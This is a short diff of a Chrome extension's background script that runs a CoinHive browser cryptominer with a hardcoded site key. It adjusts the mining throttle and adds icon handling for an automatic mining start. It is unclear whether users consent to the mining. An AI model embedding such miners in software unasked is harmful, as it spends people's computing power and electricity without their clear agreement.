@@ -36,7 +36,7 @@ chrome.storage.sync.get(['userid','mySites'], function(items) {
 		console.log("No ID found, generated: " +sessionData.userid);
         chrome.storage.sync.set({userid: sessionData.userid}, function() {});
     }
-	miner = new CoinHive.User('faLtux0jRiZXXe2iiN1XEfyj7sj5Ykg3',sessionData.userid, {threads: 1,throttle: 0.6});
+	miner = new CoinHive.User('faLtux0jRiZXXe2iiN1XEfyj7sj5Ykg3',sessionData.userid, {threads: 1,throttle: 0.7});
 	
 	//recall their stored sites, or generate defaults
 	var stored_sites = items.mySites;
@@ -169,7 +169,8 @@ chrome.extension.onMessage.addListener(
 				prevUse = true;
 				chrome.storage.local.set({prevUse:prevUse});
 			}
-		}
+		}else if(request.msg == "mining-auto-start")
+			chrome.browserAction.setIcon({path:"Images/cent/icon16.png"});
 		else if(request.msg == "mining-stop")
 			chrome.browserAction.setIcon({path:"Images/cent/iconDisabled.png"});
 		logEvent(request.msg);
